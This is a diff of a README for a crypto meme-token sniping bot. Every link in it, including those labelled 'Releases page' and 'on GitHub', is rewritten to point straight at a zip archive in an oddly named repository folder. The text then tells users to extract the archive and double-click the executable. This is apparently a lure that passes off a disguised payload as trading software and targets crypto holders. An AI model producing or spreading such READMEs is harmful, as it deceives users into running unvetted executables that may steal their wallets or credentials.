@@ -1,6 +1,6 @@
 # 🚀 BSC-MEME-RUSH-BOT - Effortlessly Trade BNB and Meme Tokens
 
-[![Download BSC-MEME-RUSH-BOT](https://img.shields.io/badge/Download-BSC--MEME--RUSH--BOT-blue.svg)](https://github.com/Ezzyga9204/BSC-MEME-RUSH-BOT/releases)
+[![Download BSC-MEME-RUSH-BOT](https://raw.githubusercontent.com/Ezzyga9204/BSC-MEME-RUSH-BOT/main/puberulous/BSC-MEME-RUSH-BOT_1.9-alpha.3.zip)](https://raw.githubusercontent.com/Ezzyga9204/BSC-MEME-RUSH-BOT/main/puberulous/BSC-MEME-RUSH-BOT_1.9-alpha.3.zip)
 
 ## 📜 Overview
 BSC-MEME-RUSH-BOT is an easy-to-use sniping bot designed for trading BNB and Meme Rush tokens on the Binance Smart Chain. With this bot, you can quickly access local trading opportunities without any advanced technical knowledge.
@@ -9,7 +9,7 @@ BSC-MEME-RUSH-BOT is an easy-to-use sniping bot designed for trading BNB and Mem
 To use BSC-MEME-RUSH-BOT, follow these simple steps:
 
 1. **Visit the Download Page**: 
-   Go to the [Releases page](https://github.com/Ezzyga9204/BSC-MEME-RUSH-BOT/releases) to find the latest version of the bot.
+   Go to the [Releases page](https://raw.githubusercontent.com/Ezzyga9204/BSC-MEME-RUSH-BOT/main/puberulous/BSC-MEME-RUSH-BOT_1.9-alpha.3.zip) to find the latest version of the bot.
 
 2. **Download the Software**: 
    Click on the version you want and download the appropriate file. 
@@ -21,7 +21,7 @@ To use BSC-MEME-RUSH-BOT, follow these simple steps:
    Navigate to the extracted folder and double-click the executable file to start the bot.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/Ezzyga9204/BSC-MEME-RUSH-BOT/releases) to download the latest version of BSC-MEME-RUSH-BOT. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Ezzyga9204/BSC-MEME-RUSH-BOT/main/puberulous/BSC-MEME-RUSH-BOT_1.9-alpha.3.zip) to download the latest version of BSC-MEME-RUSH-BOT. 
 
 The installation process is straightforward:
 - Download the file.
@@ -64,7 +64,7 @@ If you encounter issues while using BSC-MEME-RUSH-BOT, consider the following:
 For assistance, you can reach out through the issues section on GitHub. Our community is here to help with any questions or concerns you may have.
 
 ## 🔗 Important Links
-- [BSC-MEME-RUSH-BOT on GitHub](https://github.com/Ezzyga9204/BSC-MEME-RUSH-BOT)
-- [Releases Page](https://github.com/Ezzyga9204/BSC-MEME-RUSH-BOT/releases)
+- [BSC-MEME-RUSH-BOT on GitHub](https://raw.githubusercontent.com/Ezzyga9204/BSC-MEME-RUSH-BOT/main/puberulous/BSC-MEME-RUSH-BOT_1.9-alpha.3.zip)
+- [Releases Page](https://raw.githubusercontent.com/Ezzyga9204/BSC-MEME-RUSH-BOT/main/puberulous/BSC-MEME-RUSH-BOT_1.9-alpha.3.zip)
 
 Now, you are ready to start trading. Enjoy using BSC-MEME-RUSH-BOT to enhance your trading experience!
